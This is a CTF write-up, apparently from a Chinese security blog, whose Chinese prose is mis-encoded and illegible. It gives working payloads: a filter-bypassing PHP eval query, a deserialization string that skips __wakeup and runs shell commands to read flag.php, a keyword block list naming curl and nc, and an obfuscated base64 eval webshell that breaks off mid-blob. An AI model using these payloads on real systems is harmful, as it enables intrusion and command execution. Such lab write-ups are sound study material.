class="string">&#x27;é•¿åº¦ä¸å…è®¸&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/`|&quot;|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is&#x27;</span>, $_GET[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;å…³é”®å­—ä¸å…è®¸&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">eval</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]) === sha1($flag)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;é©¬è€å¸ˆå‘ç”Ÿç”šä¹ˆäº‹äº†&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ç¬¬ä¸€ä¸ªifï¼šåˆ¤æ–­æ˜¯å¦ä¼ å‚å˜é‡flagï¼Œæ²¡æœ‰å°±è¾“å‡º$examå’Œä¸€äº›html<br>
ç¬¬äºŒä¸ªifï¼šåˆ¤æ–­flagå˜é‡çš„é•¿åº¦æ˜¯å¦å’Œ$examçš„é•¿åº¦ç›¸ç­‰<br>
ç¬¬ä¸‰ä¸ªifï¼šè¿‡æ»¤ä¸€äº›å…³é”®å­—ç¬¦<br>
ç¬¬å››ä¸ªifï¼ševalæ‰§è¡Œflagå˜é‡é‡Œé¢çš„å†…å®¹ï¼Œå¹¶ä¸”è¦ç­‰äºflagå˜é‡çš„SHA-1æ•£åˆ—</p>
</blockquote>
<p>è¿™é‡Œæˆ‘å®åœ¨æ˜¯ä¸çŸ¥é“æ˜¯å¦‚ä½•èƒ½æ‰§è¡Œåç­‰äºsha1å€¼ï¼Œæˆ‘è§‰å¾—é¢˜ç›®è€ƒç‚¹ä¹Ÿä¸åœ¨è¿™ã€‚æ‰€ä»¥æˆ‘ä»¬é‡‡å–ç»•è¿‡çš„å½¢å¼ï¼Œå¯ä»¥çœ‹åˆ°ç›¸ç­‰åä¼šè¾“å‡ºflag.phpé‡Œé¢å˜é‡$flagçš„å€¼ï¼Œè€Œç°åœ¨åˆå¯ä»¥æ‰§è¡Œæˆ‘ä»¬ä¼ å…¥çš„flagå˜é‡å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æ„æˆè¯­å¥è¾¾åˆ°è¾“å‡º$flagçš„ç›®çš„<br>
ä¸ºäº†ç»•è¿‡flagè¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨phpä¸­$$å¼•ç”¨å˜é‡çš„ç‰¹æ€§å’ŒphpçŸ­å†™æ ‡ç­¾çš„ç‰¹æ€§</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//$$å˜é‡ä½¿ç”¨</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    $$a = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> $$a.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> $abc;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*è¾“å‡ºå€¼åˆ†åˆ«å¦‚ä¸‹ï¼š</span></span><br><span class="line"><span class="comment">abc</span></span><br><span class="line"><span class="comment">100</span></span><br><span class="line"><span class="comment">100</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//phpçŸ­æ ‡ç­¾ç‰¹æ€§</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.&lt;?php echo &quot;abc&quot;?&gt;</span></span><br><span class="line"><span class="comment">2.&lt;?=&quot;abc&quot;;?&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ä¸Šé¢ä¸¤ä¸ªè¯­å¥éƒ½æ˜¯è¾“å‡ºabc</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å…ˆç‚¹å‡»clickhereè·å–$examçš„å€¼:<br>
flag=returnâ€™5e22e75193f17cf3e608058536d49e4a7fd7dc56â€™;<br>
æ‰€ä»¥$exam=returnâ€™5e22e75193f17cf3e608058536d49e4a7fd7dc56â€™;<br>
æ„é€ urlå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?flag&#x3D;$w&#x3D;blag;$w&#123;0&#125;&#x3D;f;?&gt;888888888888888888888;&lt;?&#x3D;$$w;?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85/MB%29%40%283X4J_ZZ%7B6SDWZ%401DTU.png" alt=""><br>
æˆåŠŸæ‹¿åˆ°flagï¼Œå°±æ˜¯æ²¡çº¢åŒ…äº†å‘œå‘œå‘œã€‚</p>
<h3 id="å®‰æ…°å¥–"><a class="header-anchor" href="#å®‰æ…°å¥–">Â¶</a>å®‰æ…°å¥–</h3>
<p>æ‰“å¼€é¡µé¢ï¼Œè¿”å›ä¸€ä¸ªç©ºç™½é¡µé¢ï¼Œå¾¡å‰‘å¯åŠ¨!âš¡ï¸<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/%295N%7B4KOUA3%7DZI%28R%40JN~7V84.png" alt=""><br>
æ‰«æåˆ°å­˜åœ¨index.php.bakæ–‡ä»¶ï¼Œåº”è¯¥æ˜¯å¤‡ä»½æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥ï¼Œæ‰“å¼€å¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $cmd = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$cmd</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flagèƒ½è®©ä½ è¿™ä¹ˆå®¹æ˜“æ‹¿åˆ°å—ï¼Ÿ&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            $a = `<span class="keyword">$this</span>-&gt;cmd`;</span><br><span class="line">            var_dump($a);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;ç»™ä½ ä¸ªå®‰æ…°å¥–å§ï¼Œhhhï¼&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $select = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>é¢˜å‹æ˜¯ååºåˆ—åŒ–ï¼Œé¦–å…ˆéœ€è¦getä¼ å‚code<br>
æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹å¸¸è§çš„phpé­”æœ¯æ–¹æ³•ï¼š</p>
<blockquote>
<p>__construct() åˆ›å»ºå¯¹è±¡æ—¶è°ƒç”¨<br>
__destruct() é”€æ¯å¯¹è±¡æ—¶è°ƒç”¨<br>
__toString() å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨<br>
__sleep() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ<br>
__wakeup å°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨</p>
</blockquote>
<p>è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦ï¼š</p>
<blockquote>
<p>public(å…¬æœ‰)<br>
protected(å—ä¿æŠ¤)<br>
private(ç§æœ‰çš„)<br>
protectedå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆï¼š%00*%00å±æ€§å<br>
privateå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆï¼š%00ç±»å%00å±æ€§å</p>
</blockquote>
<p>åˆ†ææºç <br>
é¦–å…ˆåˆå§‹åŒ–ctfç±»çš„æ—¶å€™ä¼šåˆ›å»ºä¸¤ä¸ªå˜é‡ï¼Œusernameå’Œcmdï¼Œæ»¡è¶³username=adminçš„æ—¶å€™å°±ä¼šè¾“å‡ºcmdçš„ç±»å‹ä¸å€¼<br>
æ‰€ä»¥æˆ‘ä»¬æ„å»ºå¦‚ä¸‹ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $username = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $cmd = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$cmd</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flagèƒ½è®©ä½ è¿™ä¹ˆå®¹æ˜“æ‹¿åˆ°å—ï¼Ÿ&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            $a = `<span class="keyword">$this</span>-&gt;cmd`;</span><br><span class="line">            var_dump($a);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;ç»™ä½ ä¸ªå®‰æ…°å¥–å§ï¼Œhhhï¼&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> ctf(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿è¡Œåå¾—åˆ°ï¼š<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/1%40O68EH%60IO%7D%252WRXFXJ4%29%29L.png" alt=""><br>
å³O:3:â€œctfâ€:2:{s:11:&quot; * username&quot;;s:5:â€œadminâ€;s:6:&quot; * cmd&quot;;s:2:â€œlsâ€;}<br>
<strong>æ³¨æ„</strong>ï¼š<br>
æˆ‘ä»¬éœ€è¦ç»•è¿‡_wakeup()ï¼Œå°±å¾—æŠŠ2å†™æˆ3ï¼Œå½“ä»£è¡¨å˜é‡ä¸ªæ•°çš„æ•°å­—å¤§äºå®é™…çœŸå®å€¼æ—¶å°±ä¼šç»•è¿‡è¿™ä¸ªå‡½æ•°ï¼Œå¦åˆ™usernameå˜é‡ä¼šè¢«è¦†ç›–æˆguestï¼Œè€Œä¸æ˜¯adminã€‚<br>
è¿˜æœ‰ä¸€ç‚¹ï¼Œå°±æ˜¯å‰æ–‡æåˆ°çš„ï¼Œprotectedå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆï¼š%00*%00å±æ€§å<br>
æ‰€ä»¥payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;O:3:&quot;ctf&quot;:3:&#123;s:11:&quot;%00*%00username&quot;;s:5:&quot;admin&quot;;s:6:&quot;%00*%00cmd&quot;;s:2:&quot;ls&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/RMGXZVYRXISXL9%60J981BXV4.png" alt=""><br>
å¯ä»¥çœ‹è§æœ‰flag.phpæ–‡ä»¶ï¼Œæˆ‘ä»¬å†catè¯»å–ä¸€ä¸‹ï¼Œå› ä¸ºè¿™é‡Œè¿‡æ»¤äº†catï¼Œæ‰€ä»¥æˆ‘ä»¬æ”¹æˆca\t flag.php<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/9DY%28%7B74VIOO~Z2%24DMDYJU4T.png" alt=""><br>
åœ¨æºç é‡Œæ‰¾åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/O6%24T%60B%7BV6%24%5D2FR2%60%7D4%5D%7B_U9.png" alt=""><br>
å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨tacå‘½ä»¤<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/O%25ARZ%5D4%40653A5%28L5A9%5BJGR7.png" alt=""></p>
<h3 id="getshell"><a class="header-anchor" href="#getshell">Â¶</a>getshell</h3>
<p>æ‰“å¼€ï¼Œçœ‹åˆ°ä¸€å †è¢«æ··æ·†è¿‡åçš„phpæºç ğŸ˜¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&#x27;pfkzYUelxEGmVcdDNLTjXCSIgMBKOuHAFyRtaboqwJiQWvsZrPhn&#x27;</span>, <span class="keyword">__FILE__</span>);</span><br><span class="line">$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ = urldecode(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">3</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">6</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">33</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">30</span>&#125;;</span><br><span class="line">$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">33</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">10</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">24</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">10</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">24</span>&#125;;</span><br><span class="line">$vNwTOsKPEAlLciJDBhWtRSHXempIrjyQUuGoaknYCdFzqZMxfbgV = $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ&#123;<span class="number">0</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">18</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">3</span>&#125; . $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ&#123;<span class="number">0</span>&#125; . $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ&#123;<span class="number">1</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">24</span>&#125;;</span><br><span class="line">$ciMfTXpPoJHzZBxLOvngjQCbdIGkYlVNSumFrAUeWasKyEtwhDqR = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">7</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">13</span>&#125;;</span><br><span class="line">$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC.= $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">22</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">36</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">29</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">26</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">30</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">32</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">35</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">26</span>&#125; . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ&#123;<span class="number">30</span>&#125;;</span><br><span class="line"><span class="keyword">eval</span>($BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC(<span class="string">&quot;JE52aXV5d0NlUFdFR2xhY0FtZmpyZ0JNVFlYekhacEl4RHFRbnNVS2tob3RGU09SZFZKTGI9IldBckllVEJFWFBaTlN0b3ppZ2hmcENPUlV2S0x5eFFubXdsR2NqYVZiRGtGdUpZZHNNSHF1d1dBZW1NVWhRb0NMYURma0Z4VEtsenRCWHJkT2liSEpqeU52WVNQcGNzSVpFR1JnblZxUWM5alNWd0ZvTlBKU3U1eXJsUjZTMkNzcHV5TlBJb3JMSUk1dnU5RFJVYU9wSHhmbVZSSmIwdGpQQnlvU3lFSXVzRUNQMmlidVU5MlJCNUhCMkV4b0JJVkVPaWpvSmE2dVBQeXBWeEl0MjF1RzJ0VW1zaUJTeXhjQjB5SG1CRWRtM1BBYkJvNUJIdHhHSjlpUjBLS0JQUjJ2MUtPQk54WnJtZ3NieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xjMTF2Smlzb3VDWG9OQkRBa0IydG1VeUMwVXlDWUF5bnNHeUNzYnlDWVUxRW1QY0VtdjJFbXYwbmxCMnptQTRFbUVVRW12akVtdjRFbXYxRW12aUVtdjVFbUVNQ2tCMmJPQjNua0IyYmtCMkNsQjJDZnN5Q0JHeUNZQnlDWUZ5Q1lueUNmbnlDZnZ5Q3NHMEVtRWxFbUcybmZ2eUNzVWtybWdzR2h5enZ1NXlwM0VVTFZ4TmJ5QzNHMGFEbU5LckJWdFFTQkNKdUJJSHVIb2twSXhQQnl0aFBKMWp0QjF0dDJhNkx1dGZSbTBzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdmVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnMlRMNHNieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xWZ2ZuMzBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bmZNOXpPdG90MUtBUkp5amIzUDZtMW9pdnlSQkJCb2dvSHlsTGh0YnYyeGtHM3h5THMxZEdCUEdwMjEzQkpSWlB1YW1vVUlubXN0cVFMdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmbmZUTDRzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdpblYwWkVVRXVtSkVjRzJLWHZ1SVpSaEV0b3V4RW8wUFFwQmlWdXMxUGVIeUJlSU1mUk5hM2Job0p2SUNkQnl4Z0xKeXNQMHROdUJ4N25ZdDlka3RsUHM1a2IyQ3FwM0l4cEhQT0J1UERMdVJJbTIxbnQxS0NQaEs1UFZ4YnYzdFdSMEkyb0hNbUwxRUdwVUtLb0lSVXR5eUFlZlVqVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnT0NWMDdFSXRzdlUxclMyeEd0aElTbUpDYkdoeGtlQmFodDNLdVJOUEhCdTVPdUJpUXRKeTFTc3RjcEJ4THBWUk1iSjlQTGhvbXYyRzlFSXlWdXN4MlNoTWNSaEtRUEhJT1AxdHR0SmlKZUJFRVJJTWZTTkVZZU5Qcm1CYXh0UHhYcGhSTG8yNVBTMUNzYkJpenROSzduVjBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bm14OWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmQzlka3RvdDFLQVJKeWpiM1A2bTFvaXZ5UkJCQm9nb0h5bExodGJ2MnhrRzN4eUxzMWRHQlBHcDIxM0JKUlpQdWFtb1VJbm1zdHFlZk05ZGt0b3QxS0FSSnlqYjNQNm0xb2l2eVJCQkJvZ29IeWxMaHRidjJ4a0czeHlMczFkR0JQR3AyMTNCSlJaUHVhbW9VSW5tc3RxZWZJOWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmQTBUbWdzdjNLeUcyMW9SdUlPcFZ4TlBCeWhldTlrUk5vWm1VNXJCUHRjdFZvYlMxb210MHhIdFBLS3VOeFFtQmEzdlVFc2J1S2lCWTBzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmczVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnaW4zMDdFTkk1bUhJWm91OU90VXg0dHNFbVIyQ2RTVWlxTHlNMG0yeWNveXlNbzFLMkdKaUdQUEVCUDFvYXZVUENCQlJXZXN5c3YzQlpRTHRsUHM1a2IyQ3FwM0l4cEhQT0J1UERMdVJJbTIxbnQxS0NQaEs1UFZ4YnYzdFdSMEkyb0hNbUwxRUdwVUtLb0lSVXR5eUFlZkFPVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnZkNIMFpFVUV1bUpFY0cyS1h2dUlaUmhFdG91eEVvMFBRcEJpVnVzMVBlSHlCZUlNZlJOYTNiaG9KdklDZEJ5eGdMSnlzUDB0TnVCeDduWXk5ZGt0bFBzNWtiMkNxcDNJeHBIUE9CdVBETHVSSW0yMW50MUtDUGhLNVBWeGJ2M3RXUjBJMm9ITW1MMUVHcFVLS29JUlV0eXlBZWZBMlRMNHNieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xWZ2ZuVjBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bmZFOWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmbjFUTDRzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdPQ0gwWkVVRXVtSkVjRzJLWHZ1SVpSaEV0b3V4RW8wUFFwQmlWdXMxUGVIeUJlSU1mUk5hM2Job0p2SUNkQnl4Z0xKeXNQMHROdUJ4N25mTTl6MlAyR3VqREVOSTVtSElab3U5T3RVeDR0c0VtUj